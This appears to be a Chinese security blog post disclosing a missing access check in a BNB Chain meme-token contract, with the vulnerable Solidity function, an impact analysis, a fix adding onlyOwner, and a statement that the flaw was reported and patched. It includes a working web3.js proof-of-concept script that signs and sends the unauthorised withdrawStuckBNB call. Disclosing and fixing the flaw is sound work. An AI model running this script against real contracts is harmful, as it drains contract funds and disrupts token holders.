#  某合约任意提取BNB漏洞   
原创 烽火台实验室  Beacon Tower Lab   2025-03-17 18:24  
  
**1**  
  
  
**背景描述**  
  
合约是一个在满足特定条件时在区块链上执行代码的程序，各方以数字签署合同的方式准许并维护它的其运行。这些代码可以是向朋友汇款、买卖 NFT 虚拟商品等一系列复杂的内容。  
  
 存在漏洞的目标合约是一个结合Meme文化病毒式传播与去中心化金融（DeFi）的创新项目，旨在通过趣味性和实用性打破传统Meme代币的模式。  
  
该合约的代币目前市值1400K（USDT），日均交易量150K（USDT）  
  
  
**2**  
  
  
**问题描述**  
  
该合约“withdrawStuckBNB”函数没有添加权限控制，攻击者可以通过调用“withdrawStuckBNB”函数，将合约内所有BNB转至营销地址“marketingAddress”，从而导致合约交易异常。  
  
  
 **tips：**  
  
BNB是BNB链生态系统的原生代币，该系统包含BNB智能链（BSC）和BNB信标链。在BNB智能链上，BNB用于支付交易费用和参与网络的共识机制。BNB还被用作实用代币，使用户在Binance中心化加密货币交易所进行交易时获得交易费用的折扣。  
  
BNB在这个合约中的作用包括：作为交易对的配对货币，用于支付交易手续费，流动性池的组成部分，以及手续费收入的分配媒介  
  
  
**3**  
  
  
**问题代码分析**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOhm3uvW6XibATdWMxIeRdxVDuLcVRl9ZQnVPVywI82qlp85GF4T9tOibB46tV69EWhvr64tEOAmVIw/640?wx_fmt=png&from=appmsg "")  
  
```
```solidity
function withdrawStuckBNB() external {
    bool success;
    (success,) = address(marketingAddress).call{value: address(this).balance}("");
}
```
```  
  
  
在合约代码里面可以看到，`withdrawStuckBNB` 没有添加onlyOwner修饰，只有external修饰  
  
****  
**tips：**  
  
    Solidity语法中有4中默认函数修饰符  
  
    - public：最大访问权限，任何人都可以调用。  
  
    - private：只有合约内部可以调用，不可以被继承。  
  
    - internal：子合约可以继承和调用。  
  
    - external：外部可以调用，子合约可以继承和调用，当前合约不可以调用。  
  
onlyOwner是该合约自定义一个修饰器，用于修饰函数，只有合约的所有者才能调用该函数。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOhm3uvW6XibATdWMxIeRdxVKpZGdnWGOf7kpXfIgZGsbZ2VPmYjWaKQ5dLdnt2OOf4HLaV4Mz7OpQ/640?wx_fmt=png&from=appmsg "")  
  
  
这就意味着任何人都可以调用这个函数，将合约内所有BNB转至营销地址，导致资金被盗。  
  
  
**4**  
  
  
**后续利用链分析**  
  
从问题代码可知，任何人都可以调用这个函数，将合约内所有BNB转至营销地址marketingAddress  
  
查看marketingAddress的代码，marketingAddress是一个营销地址，更新marketingAddress的代码如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOhm3uvW6XibATdWMxIeRdxVLy18fvAGhwY90SjbU2MrvZQRYlAMM8mTnK9WPmaTIloLBTrywYkhjg/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到，updateMarketingAddress函数存在onlyOwner修饰，只有owner可以调用这个函数，这就意味着只有owner可以更新marketingAddress的地址。所以利用链到此截止，攻击者只能调用withdrawStuckBNB将合约内的BNB转至marketingAddress，但是marketingAddress本身只能由owner更新，所以攻击者无法更新marketingAddress的地址，从而无法将BNB转至攻击者的地址，但是漏洞也能造成合约内BNB的清空，影响合约运行。  
  
  
**5**  
  
  
**构造POC**  
```
```javascript
const Web3 = require('web3');
// // 初始化 Web3 实例，这里使用测试网的地址，你可以根据实际情况修改
const web3 = new Web3('https://data-seed-prebsc-1-s1.binance.org:8545');
// const web3 = new Web3('https://bsc-dataseed4.binance.org/');

const contractABI = ["""换成完整ABI"""];
const contractAddress = "0xaaaaa"; // 替换为目标合约地址
const contract = new web3.eth.Contract(contractABI, contractAddress);
console.log("connect success");

// 如果使用 Node.js，需要添加私钥
const privateKey = '0xbbbbbbbbbbbbbb'; // 替换为你的私钥
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
web3.eth.accounts.wallet.add(account);

async function withdrawBNB() {
    try{
        console.log(account.address);
        const tx = {
            from: account.address, // 必须使用真实地址
            to: contractAddress,
            gas: 300000,
            data: contract.methods.withdrawStuckBNB().encodeABI()
        };

        // 估算 gas
        const gas = await web3.eth.estimateGas(tx);
        tx.gas = gas;

        // 获取当前 gasPrice
        const gasPrice = await web3.eth.getGasPrice();
        tx.gasPrice = gasPrice;

        // 签名并发送交易（Node.js 方式）
        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        console.log('Transaction Hash:', receipt.transactionHash);
        console.log('Receipt:', receipt);
    } catch (error) {
        console.error("Error:", error);
    }
    console.log("2");
}

withdrawBNB();
console.log("3");
```

```  
  
  
**6**  
  
  
**修复方案**  
  
在withdrawStuckBNB函数中添加onlyOwner修饰，只允许owner可以调用这个函数  
  
   
```
```solidity
function withdrawStuckBNB() external onlyOwner {
    (bool success,) = marketingAddress.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```
```  
  
  
   该漏洞目前  
已向相关单位和厂商报送并已推出补丁，  
使用此漏洞造成的任何攻击影响均与本文作者无关。  
  
  
  
  
  
  
